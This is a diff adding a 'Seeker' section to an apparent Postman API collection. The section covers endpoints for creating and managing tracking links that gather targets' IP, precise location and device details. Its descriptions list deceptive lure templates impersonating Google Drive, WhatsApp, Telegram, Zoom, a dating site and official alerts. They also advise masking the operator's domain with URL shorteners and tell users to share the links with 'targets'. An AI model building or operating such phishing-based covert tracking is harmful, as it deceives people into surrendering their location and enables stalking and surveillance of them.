@@ -823,6 +823,157 @@
 			"description": "History endpoints for viewing user's search history with paginated metadata and detailed results"
 		},
 		{
+			"name": "Seeker",
+			"item": [
+				{
+					"name": "Create Seeker Link",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"if (pm.response.code === 200) {",
+									"    var jsonData = pm.response.json();",
+									"    if (jsonData.data && jsonData.data.id) {",
+									"        pm.environment.set('seeker_link_id', jsonData.data.id);",
+									"        pm.environment.set('seeker_link_url', jsonData.data.url);",
+									"        console.log('✅ Seeker link ID saved: ' + jsonData.data.id);",
+									"    }",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{access_token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"template\": \"nearyou\",\n  \"title\": \"Campaign 1\",\n  \"redirect_url\": \"https://www.google.com\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/seeker/links",
+							"host": ["{{base_url}}"],
+							"path": ["seeker", "links"]
+						},
+						"description": "Create a new Seeker tracking link for geolocation/device-info collection. templates: nearyou, gdrive, whatsapp, telegram, zoom, captcha, secure_briefing, clearance_check, secure_message, official_alert. Returns url (short/external), external_url (when anonymizer enabled), short_url, short_code, direct_url. Use url/external_url to share. Set SEEKER_ANONYMIZE_URL_SERVICE (v.gd/is.gd/tinyurl) to hide your domain."
+					},
+					"response": []
+				},
+				{
+					"name": "List Seeker Links",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{access_token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/seeker/links?limit=20&skip=0",
+							"host": ["{{base_url}}"],
+							"path": ["seeker", "links"],
+							"query": [
+								{
+									"key": "limit",
+									"value": "20",
+									"description": "Number of links to return (default 20, max 100)"
+								},
+								{
+									"key": "skip",
+									"value": "0",
+									"description": "Number of links to skip (pagination)"
+								}
+							]
+						},
+						"description": "List all Seeker links for the authenticated user. Returns items with id, template, title, url (short), short_url, short_code, direct_url, created_at."
+					},
+					"response": []
+				},
+				{
+					"name": "Get Seeker Link",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{access_token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/seeker/links/{{seeker_link_id}}",
+							"host": ["{{base_url}}"],
+							"path": ["seeker", "links", "{{seeker_link_id}}"]
+						},
+						"description": "Get Seeker link details by ID. Requires seeker_link_id (set automatically after Create Seeker Link)."
+					},
+					"response": []
+				},
+				{
+					"name": "Get Seeker Link Results",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{access_token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/seeker/links/{{seeker_link_id}}/results?limit=50&skip=0",
+							"host": ["{{base_url}}"],
+							"path": ["seeker", "links", "{{seeker_link_id}}", "results"],
+							"query": [
+								{
+									"key": "limit",
+									"value": "50",
+									"description": "Number of results to return (default 50, max 100)"
+								},
+								{
+									"key": "skip",
+									"value": "0",
+									"description": "Number of results to skip (pagination)"
+								}
+							]
+						},
+						"description": "Get results (device info + location) for a Seeker link. Each result includes platform, browser, ip, ip_info, lat, lon, accuracy, status, created_at."
+					},
+					"response": []
+				},
+				{
+					"name": "Delete Seeker Link",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{access_token}}"
+							}
+						],
+						"url": {
+							"raw": "{{base_url}}/seeker/links/{{seeker_link_id}}",
+							"host": ["{{base_url}}"],
+							"path": ["seeker", "links", "{{seeker_link_id}}"]
+						},
+						"description": "Delete a Seeker link. Only the link owner can delete. Results are not deleted."
+					},
+					"response": []
+				}
+			],
+			"description": "Seeker geolocation/device-info collection. Create tracking links with short URLs (e.g. /l/x7k2ab9c) or anonymized URLs (v.gd/is.gd) via SEEKER_ANONYMIZE_URL_SERVICE. Templates: nearyou (dating), gdrive (Google Drive), whatsapp, telegram, zoom, captcha, secure_briefing, clearance_check, secure_message, official_alert. Share url with targets; they redirect to the tracking page. Retrieve device info + location when targets visit and grant permission. Results appear in History (queryType: seeker-lookup)."
+		},
+		{
 			"name": "Admin",
 			"item": [
 				{
